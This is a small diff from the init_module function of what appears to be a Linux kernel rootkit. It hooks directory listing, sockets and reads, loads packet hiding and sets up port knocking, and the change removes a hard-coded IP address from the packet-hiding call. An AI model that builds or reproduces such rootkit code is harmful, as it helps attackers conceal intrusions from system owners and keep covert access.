@@ -34,7 +34,7 @@ int init_module (void)
 	hook_getdents();	
 	hook_sockets();
 	hook_read();
-	load_packet_hiding("131.159.206.15");
+	load_packet_hiding();
 	
 	/* load port knocking */
 	ret = load_port_knocking();	
